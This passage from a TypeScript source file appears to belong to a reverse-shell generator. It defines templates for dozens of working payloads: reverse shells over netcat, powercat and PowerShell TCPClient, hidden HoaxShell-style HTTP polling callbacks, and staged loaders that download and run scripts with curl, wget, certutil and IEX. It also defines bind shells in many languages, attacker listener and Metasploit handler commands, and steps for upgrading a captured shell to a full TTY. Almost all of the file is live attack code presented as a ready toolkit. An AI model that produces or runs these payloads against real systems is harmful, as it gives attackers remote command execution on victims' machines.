    render: ({ lhost, lport, shell }) => `nc.exe -e ${shell} ${lhost} ${lport}`,
  },
  {
    id: "cmd-powercat-exe",
    name: "CMD powercat.exe",
    family: "cmd",
    platform: "windows",
    description:
      "Windows cmd.exe reverse shell using a standalone powercat executable.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport, shell }) =>
      `powercat.exe -c ${lhost} -p ${lport} -e ${shell}`,
  },
  {
    id: "cmd-telnet-double",
    name: "CMD telnet double pipe",
    family: "cmd",
    platform: "windows",
    description:
      "Windows cmd.exe reverse shell fallback using two telnet connections.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport, shell }) =>
      `${shell} | telnet ${lhost} ${lport} | ${shell} | telnet ${lhost} ${lport}`,
  },
  {
    id: "powershell-tcp-client",
    name: "PowerShell TCPClient",
    family: "powershell",
    platform: "windows",
    description: "PowerShell reverse shell with an interactive command loop.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
  },
  {
    id: "powershell-nishang-style",
    name: "PowerShell Nishang-style",
    family: "powershell",
    platform: "windows",
    description:
      "Compact PowerShell TCP reverse shell inspired by common Nishang workflows.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
  },
  {
    id: "powershell-powercat",
    name: "PowerShell powercat",
    family: "powershell",
    platform: "windows",
    description: "PowerShell loader for a powercat reverse shell.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `powershell -NoP -Command "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}/powercat.ps1');powercat -c ${lhost} -p ${lport} -e powershell"`,
  },
  {
    id: "powershell-hoaxshell-style",
    name: "PowerShell HoaxShell-style",
    family: "powershell",
    platform: "windows",
    description:
      "HTTP polling PowerShell callback inspired by HoaxShell workflows.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "$u='http://${lhost}:${lport}';while($true){try{$r=iwr -UseBasicParsing $u;$c=$r.Content;if($c){$o=iex $c 2>&1 | Out-String;iwr -UseBasicParsing -Method POST -Body $o $u}}catch{};Start-Sleep -Seconds 2}"`,
  },
  {
    id: "powershell-hoaxshell-compact",
    name: "PowerShell HoaxShell compact",
    family: "powershell",
    platform: "windows",
    description: "Shorter HoaxShell-style HTTP polling loop for PowerShell.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `powershell -NoP -W Hidden -c "$u='http://${lhost}:${lport}';for(;;){try{$c=(iwr -UseB $u).Content;if($c){$o=iex $c 2>&1|Out-String;iwr -UseB -Method POST -Body $o $u}}catch{};sleep 2}"`,
  },
  {
    id: "powershell-hoaxshell-pwsh",
    name: "PowerShell HoaxShell pwsh",
    family: "powershell",
    platform: "multi",
    description: "HoaxShell-style HTTP polling loop for PowerShell Core.",
    defaultShell: "pwsh.exe",
    render: ({ lhost, lport }) =>
      `pwsh -NoP -NonI -Command "$u='http://${lhost}:${lport}';while($true){try{$c=(Invoke-WebRequest -UseBasicParsing $u).Content;if($c){$o=Invoke-Expression $c 2>&1 | Out-String;Invoke-WebRequest -UseBasicParsing -Method POST -Body $o $u}}catch{};Start-Sleep -Seconds 2}"`,
  },
  {
    id: "powershell-hoaxshell-webclient",
    name: "PowerShell HoaxShell WebClient",
    family: "powershell",
    platform: "windows",
    description: "HoaxShell-style polling loop using Net.WebClient.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "$w=New-Object Net.WebClient;$u='http://${lhost}:${lport}';while($true){try{$c=$w.DownloadString($u);if($c){$o=iex $c 2>&1|Out-String;$w.UploadString($u,$o)}}catch{};Start-Sleep -Seconds 2}"`,
  },
  {
    id: "bash-hoaxshell-curl",
    name: "Bash HoaxShell curl",
    family: "bash",
    platform: "linux",
    description: "HoaxShell-style HTTP polling loop using Bash and curl.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport, shell }) =>
      `${shell} -c 'u=http://${lhost}:${lport};while :;do c=$(curl -fsS $u);[ "$c" ]&&${shell} -c "$c" 2>&1|curl -fsS -X POST --data-binary @- $u;sleep 2;done'`,
  },
  {
    id: "python3-hoaxshell-urllib",
    name: "Python 3 HoaxShell urllib",
    family: "python",
    platform: "multi",
    description:
      "HoaxShell-style HTTP polling loop implemented with Python urllib.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `python3 -c 'import subprocess,time,urllib.request;u="http://${lhost}:${lport}";\nwhile True:\n c=urllib.request.urlopen(u).read().decode();\n o=subprocess.getoutput(c) if c else "";\n urllib.request.urlopen(u,o.encode()) if o else None;\n time.sleep(2)'`,
  },
  {
    id: "bash-curl-staged",
    name: "Bash curl staged",
    family: "staged",
    platform: "linux",
    description:
      "Fetches a second-stage script from your HTTP server and pipes it to the shell.",
    defaultShell: "/bin/bash",
    render: ({ lhost, httpPort, lport, shell }) =>
      `curl -fsSL http://${lhost}:${httpPort ?? lport}/rs.sh | ${shell}`,
  },
  {
    id: "bash-wget-staged",
    name: "Bash wget staged",
    family: "staged",
    platform: "linux",
    description:
      "Fetches a second-stage script with wget and pipes it to the shell.",
    defaultShell: "/bin/bash",
    render: ({ lhost, httpPort, lport, shell }) =>
      `wget -qO- http://${lhost}:${httpPort ?? lport}/rs.sh | ${shell}`,
  },
  {
    id: "python3-http-staged",
    name: "Python 3 HTTP staged",
    family: "staged",
    platform: "multi",
    description: "Python 3 loader that downloads and executes a staged script.",
    defaultShell: "/bin/sh",
    render: ({ lhost, httpPort, lport, shell }) =>
      `python3 -c 'import urllib.request,subprocess;subprocess.call(["${shell}","-c",urllib.request.urlopen("http://${lhost}:${httpPort ?? lport}/rs.sh").read().decode()])'`,
  },
  {
    id: "bash-curl-dropper-staged",
    name: "Bash curl dropper",
    family: "staged",
    platform: "linux",
    description:
      "Downloads the stage to /tmp, marks it executable, then runs it.",
    defaultShell: "/bin/bash",
    render: ({ lhost, httpPort, lport }) =>
      `curl -fsSL http://${lhost}:${httpPort ?? lport}/rs.sh -o /tmp/rs.sh && chmod +x /tmp/rs.sh && /tmp/rs.sh`,
  },
  {
    id: "bash-wget-dropper-staged",
    name: "Bash wget dropper",
    family: "staged",
    platform: "linux",
    description:
      "Downloads the stage with wget, marks it executable, then runs it.",
    defaultShell: "/bin/bash",
    render: ({ lhost, httpPort, lport }) =>
      `wget -q http://${lhost}:${httpPort ?? lport}/rs.sh -O /tmp/rs.sh && chmod +x /tmp/rs.sh && /tmp/rs.sh`,
  },
  {
    id: "macos-curl-zsh-staged",
    name: "macOS curl zsh staged",
    family: "staged",
    platform: "macos",
    description: "macOS-friendly curl loader that pipes the stage into zsh.",
    defaultShell: "/bin/zsh",
    render: ({ lhost, httpPort, lport }) =>
      `curl -fsSL http://${lhost}:${httpPort ?? lport}/rs.sh | zsh`,
  },
  {
    id: "windows-certutil-staged",
    name: "Windows certutil staged",
    family: "staged",
    platform: "windows",
    description: "Downloads a Windows stage with certutil and executes it.",
    defaultShell: "cmd.exe",
    render: ({ lhost, httpPort, lport }) =>
      `certutil -urlcache -split -f http://${lhost}:${httpPort ?? lport}/rs.bat %TEMP%\\rs.bat && %TEMP%\\rs.bat`,
  },
  {
    id: "windows-powershell-iex-staged",
    name: "Windows PowerShell IEX staged",
    family: "staged",
    platform: "windows",
    description:
      "Downloads and executes a PowerShell stage with Invoke-Expression.",
    defaultShell: "powershell.exe",
    render: ({ lhost, httpPort, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://${lhost}:${httpPort ?? lport}/rs.ps1')"`,
  },
  {
    id: "nodejs-http-staged",
    name: "Node.js HTTP staged",
    family: "staged",
    platform: "multi",
    description:
      "Node.js loader that downloads a stage and runs it through the shell.",
    defaultShell: "/bin/sh",
    render: ({ lhost, httpPort, lport, shell }) =>
      `node -e "require('http').get('http://${lhost}:${httpPort ?? lport}/rs.sh',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>require('child_process').exec(d,{shell:'${q(shell)}'}))})"`,
  },
  {
    id: "php-http-staged",
    name: "PHP HTTP staged",
    family: "staged",
    platform: "multi",
    description:
      "PHP loader that downloads and executes a staged shell script.",
    defaultShell: "/bin/sh",
    render: ({ lhost, httpPort, lport }) =>
      `php -r '$c=file_get_contents("http://${lhost}:${httpPort ?? lport}/rs.sh");system($c);'`,
  },
  {
    id: "perl-http-staged",
    name: "Perl HTTP staged",
    family: "staged",
    platform: "multi",
    description: "Perl loader that fetches a stage over HTTP and runs it.",
    defaultShell: "/bin/sh",
    render: ({ lhost, httpPort, lport }) =>
      `perl -MHTTP::Tiny -e '$c=HTTP::Tiny->new->get("http://${lhost}:${httpPort ?? lport}/rs.sh")->{content};system($c)'`,
  },
  {
    id: "ruby-http-staged",
    name: "Ruby HTTP staged",
    family: "staged",
    platform: "multi",
    description: "Ruby loader that fetches a stage over HTTP and runs it.",
    defaultShell: "/bin/sh",
    render: ({ lhost, httpPort, lport }) =>
      `ruby -ropen-uri -e 'system(URI.open("http://${lhost}:${httpPort ?? lport}/rs.sh").read)'`,
  },
  {
    id: "nc-bind-e",
    name: "Netcat bind -e",
    family: "bind",
    platform: "multi",
    description:
      "Bind shell for labs where inbound access to the target is available.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) => `nc -lvnp ${lport} -e ${shell}`,
  },
  {
    id: "ncat-bind-exec",
    name: "Ncat bind --exec",
    family: "bind",
    platform: "multi",
    description: "Ncat bind shell using the explicit --exec option.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) => `ncat -lvnp ${lport} --exec ${shell}`,
  },
  {
    id: "python3-bind",
    name: "Python 3 bind shell",
    family: "bind",
    platform: "multi",
    description:
      "Python bind shell that listens on the target instead of calling back.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) =>
      `python3 -c 'import os,socket,subprocess as p;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];p.call(["${shell}","-i"])'`,
  },
  {
    id: "socat-bind-pty",
    name: "Socat bind PTY",
    family: "bind",
    platform: "linux",
    description: "Socat bind shell with PTY-friendly options.",
    defaultShell: "/bin/bash",
    render: ({ lport, shell }) =>
      `socat tcp-listen:${lport},reuseaddr,fork exec:'${q(shell)} -li',pty,stderr,setsid,sigint,sane`,
  },
  {
    id: "php-bind-shell",
    name: "PHP bind shell",
    family: "bind",
    platform: "multi",
    description:
      "PHP bind shell that accepts one TCP client and runs commands.",
    defaultShell: "/bin/sh",
    render: ({ lport }) =>
      `php -r '$s=stream_socket_server("tcp://0.0.0.0:${lport}");$c=stream_socket_accept($s);while($cmd=fgets($c)){fwrite($c,shell_exec($cmd));}'`,
  },
  {
    id: "ruby-bind-shell",
    name: "Ruby bind shell",
    family: "bind",
    platform: "multi",
    description: "Ruby bind shell that executes received commands.",
    defaultShell: "/bin/sh",
    render: ({ lport }) =>
      `ruby -rsocket -e 's=TCPServer.new(${lport});c=s.accept;while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read};end'`,
  },
  {
    id: "nodejs-bind-shell",
    name: "Node.js bind shell",
    family: "bind",
    platform: "multi",
    description: "Node.js bind shell that executes received commands.",
    defaultShell: "/bin/sh",
    render: ({ lport }) =>
      `node -e "require('net').createServer(c=>c.on('data',d=>require('child_process').exec(d.toString(),(e,o,r)=>c.write(o+r)))).listen(${lport})"`,
  },
  {
    id: "busybox-nc-bind",
    name: "BusyBox nc bind",
    family: "bind",
    platform: "linux",
    description: "BusyBox netcat bind shell using -e.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) => `busybox nc -lp ${lport} -e ${shell}`,
  },
  {
    id: "bind-nc-traditional-e",
    name: "Netcat traditional bind -e",
    family: "bind",
    platform: "linux",
    description:
      "Bind shell for netcat-traditional builds that expose the -e option.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) => `nc.traditional -lvnp ${lport} -e ${shell}`,
  },
  {
    id: "bind-perl-socket",
    name: "Perl bind socket",
    family: "bind",
    platform: "multi",
    description:
      "Perl bind shell that accepts one TCP client and execs a shell.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) =>
      `perl -e 'use Socket;$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("${q(shell)} -i");'`,
  },
  {
    id: "bind-powershell-tcp-listener",
    name: "PowerShell bind listener",
    family: "bind",
    platform: "windows",
    description:
      "PowerShell bind shell using TcpListener (connect from the attacker with a bind listener).",
    defaultShell: "powershell.exe",
    render: ({ lport }) =>
      `$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, ${lport});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$listener.Stop()`,
  },
  {
    id: "bind-cmd-nc-listen",
    name: "CMD nc bind listen",
    family: "bind",
    platform: "windows",
    description: "Windows cmd.exe bind shell using nc.exe listen mode.",
    defaultShell: "cmd.exe",
    render: ({ lport }) => `nc.exe -lvnp ${lport} -e cmd.exe`,
  },
  {
    id: "golang-bind-tcp",
    name: "Go bind TCP shell",
    family: "go",
    platform: "multi",
    description:
      "Go bind shell one-liner for targets with Go installed (compile/run on target).",
    defaultShell: "/bin/sh",
    render: ({ lport }) =>
      `echo 'package main;import("net";"os/exec");func main(){l,_:=net.Listen("tcp",":${lport}");c,_:=l.Accept();cmd:=exec.Command("/bin/sh","-i");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' >/tmp/bind.go && go run /tmp/bind.go`,
  },
  {
    id: "lua-bind-tcp",
    name: "Lua bind TCP",
    family: "bind",
    platform: "multi",
    description:
      "Lua bind shell using LuaSocket (requires luasocket on the target).",
    defaultShell: "/bin/sh",
    render: ({ lport }) =>
      `lua -e 'local s=require("socket");local srv=s.bind("*",${lport});local c=srv:accept();while true do local r=c:receive();local f=io.popen(r,"r");c:send(f:read("*a")) end'`,
  },
  {
    id: "staged-busybox-wget",
    name: "BusyBox wget staged",
    family: "staged",
    platform: "linux",
    description:
      "BusyBox wget loader that pipes a staged script into the shell.",
    defaultShell: "/bin/sh",
    render: ({ lhost, httpPort, lport, shell }) =>
      `wget -qO- http://${lhost}:${httpPort ?? lport}/rs.sh | ${shell}`,
  },
  {
    id: "cmd-powershell-tcp-reverse",
    name: "CMD PowerShell TCP reverse",
    family: "cmd",
    platform: "windows",
    description:
      "cmd.exe launcher for a compact PowerShell TCP reverse shell one-liner.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length)}"`,
  },
];

export const listenerTemplates: ListenerTemplate[] = [
  {
    id: "nc",
    name: "Netcat",
    description: "Simple TCP listener.",
    command: (lport) => `nc -lvnp ${lport}`,
  },
  {
    id: "nc-traditional",
    name: "Netcat traditional",
    description: "Fallback syntax for older netcat builds.",
    command: (lport) => `nc -lvp ${lport}`,
  },
  {
    id: "rlwrap-nc",
    name: "rlwrap + netcat",
    description: "Adds readline history and line editing to netcat.",
    command: (lport) => `rlwrap -cAr nc -lvnp ${lport}`,
  },
  {
    id: "rlwrap-nc-traditional",
    name: "rlwrap + netcat traditional",
    description: "Line editing with old netcat listener syntax.",
    command: (lport) => `rlwrap -cAr nc -lvp ${lport}`,
  },
  {
    id: "ncat",
    name: "Ncat",
    description: "Nmap ncat TCP listener.",
    command: (lport) => `ncat -lvnp ${lport}`,
  },
  {
    id: "ncat-keep-open",
    name: "Ncat keep-open",
    description: "Ncat listener that keeps accepting new connections.",
    command: (lport) => `ncat -k -lvnp ${lport}`,
  },
  {
    id: "ncat-ssl",
    name: "Ncat SSL",
    description: "TLS listener for custom SSL-capable payloads.",
    command: (lport) => `ncat --ssl -lvnp ${lport}`,
  },
  {
    id: "ncat-ssl-keep-open",
    name: "Ncat SSL keep-open",
    description: "TLS ncat listener that remains open after disconnects.",
    command: (lport) => `ncat --ssl -k -lvnp ${lport}`,
  },
  {
    id: "socat-tty",
    name: "Socat TTY",
    description: "Listener configured for a stronger interactive TTY.",
    command: (lport) =>
      `socat file:\`tty\`,raw,echo=0 tcp-listen:${lport},reuseaddr`,
  },
  {
    id: "socat-fork",
    name: "Socat fork",
    description: "Basic socat TCP listener that forks per connection.",
    command: (lport) => `socat - TCP-LISTEN:${lport},reuseaddr,fork`,
  },
  {
    id: "pwncat",
    name: "pwncat-cs",
    description: "pwncat-cs listener with post-exploitation helpers.",
    command: (lport) => `pwncat-cs -lp ${lport}`,
  },
  {
    id: "powercat",
    name: "Powercat",
    description: "PowerShell-friendly listener using powercat.",
    command: (lport) => `powercat -l -p ${lport} -v`,
  },
  {
    id: "bind-connect",
    name: "Bind shell connect",
    description: "Connect to a bind shell already listening on the target.",
    command: (lport, lhost) => `nc -nv ${lhost} ${lport}`,
  },
  {
    id: "msfconsole",
    name: "Metasploit handler",
    description:
      "Bash reverse shell handler; match payload options before use.",
    command: (lport, lhost) =>
      `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_bash; set LHOST ${lhost}; set LPORT ${lport}; run'`,
  },
  {
    id: "msfconsole-windows",
    name: "Metasploit Windows handler",
    description:
      "Windows reverse TCP handler; match payload options before use.",
    command: (lport, lhost) =>
      `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; run'`,
  },
  {
    id: "openssl-server",
    name: "OpenSSL s_server",
    description: "Temporary TLS listener for openssl s_client payloads.",
    command: (lport) =>
      `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj '/CN=reverseshell' && openssl s_server -quiet -key key.pem -cert cert.pem -port ${lport}`,
  },
];

export const upgradeRecipes: UpgradeRecipe[] = [
  {
    id: "python-pty",
    name: "Python PTY upgrade",
    platform: "linux",
    description: "The most common upgrade path when Python is present.",
    steps: (shell) => [
      `python3 -c 'import pty; pty.spawn("${shell}")' || python -c 'import pty; pty.spawn("${shell}")'`,
      "Ctrl-Z",
      "stty raw -echo; fg",
      "reset",
      "export TERM=xterm-256color",
      "stty rows 40 columns 120",
    ],
  },
  {
    id: "script-tty",
    name: "script fallback",
    platform: "linux",
    description: "Useful on hosts without Python but with util-linux script.",
    steps: (shell) => [`script -qc ${shell} /dev/null`, "export TERM=xterm"],
  },
  {
    id: "script-bsd-tty",
    name: "script BSD/macOS fallback",
    platform: "macos",
    description: "BSD script syntax for macOS and BSD-like targets.",
    steps: (shell) => [`script -q /dev/null ${shell}`, "export TERM=xterm"],
  },
  {
    id: "stty-stabilize",
    name: "stty job-control stabilize",
    platform: "multi",
    description:
      "Generic stabilization steps after spawning a PTY with Python or script.",
    steps: () => [
      "Ctrl-Z",
      "stty raw -echo; fg",
      "reset",
      "export SHELL=/bin/bash",
      "export TERM=xterm-256color",
      "stty rows 40 columns 120",
    ],
  },
  {
    id: "rlwrap-reconnect",
    name: "rlwrap reconnect",
    platform: "multi",
    description:
      "Reconnect through rlwrap when the target has Bash /dev/tcp support.",
    steps: (shell, attackerHost, port) => [
      `Attacker: rlwrap -cAr nc -lvnp ${port}`,
      `Target: bash -c '${shell} -i >& /dev/tcp/${attackerHost}/${port} 0>&1'`,
    ],
  },
  {
    id: "expect-spawn",
    name: "expect spawn",
    platform: "multi",
    description: "PTY fallback when expect is installed on the target.",
    steps: (shell) => [
      `expect -c 'spawn ${shell}; interact'`,
      "export TERM=xterm",
    ],
  },
  {
    id: "socat-upgrade",
    name: "Socat full TTY",
    platform: "linux",
    description: "Best terminal behavior when socat exists on both ends.",
    steps: (shell, attackerHost, port) => [
      `Attacker: socat file:\`tty\`,raw,echo=0 tcp-listen:${port},reuseaddr`,
      `Target: socat exec:'${shell} -li',pty,stderr,setsid,sigint,sane tcp:${attackerHost}:${port}`,
    ],
  },
  {
    id: "windows-conpty",
    name: "Windows ConPTY note",
    platform: "windows",
    description: "Upgrade guidance for modern Windows shells.",
    steps: () => [
      "Use a ConPTY-aware payload/listener when possible.",
      "If only PowerShell is available, prefer ncat or PowerShell remoting for a stable interactive session.",
      "Set code page first if output is garbled: chcp 65001",
    ],
  },
  {
    id: "windows-codepage",
    name: "Windows code page cleanup",
    platform: "windows",
    description: "Small fixes for garbled Windows shell output.",
    steps: () => [
      "chcp 65001",
      "set TERM=xterm",
      "powershell -NoLogo -NoProfile",
    ],
  },
  {
    id: "windows-ncat-reconnect",
    name: "Windows ncat reconnect",
    platform: "windows",
    description:
      "Reconnect with ncat for a cleaner Windows shell when ncat is available.",
    steps: (_shell, attackerHost, port) => [
      `Attacker: rlwrap -cAr ncat -lvnp ${port}`,
      `Target CMD: ncat.exe ${attackerHost} ${port} -e cmd.exe`,
      `Target PowerShell: ncat.exe ${attackerHost} ${port} -e powershell.exe`,
    ],
  },
];

export function getTemplate(templateId: string): ReverseShellTemplate {
  return (
    reverseShellTemplates.find((template) => template.id === templateId) ??
    reverseShellTemplates[0]
  );
}

export function defaultConfig(): ReverseShellConfig {
  const template = reverseShellTemplates[0];
  return {
    templateId: template.id,
    lhost: "10.10.14.3",
    lport: 4444,
    httpPort: 8000,
    shell: template.defaultShell,
    obfuscation: "none",
  };
}
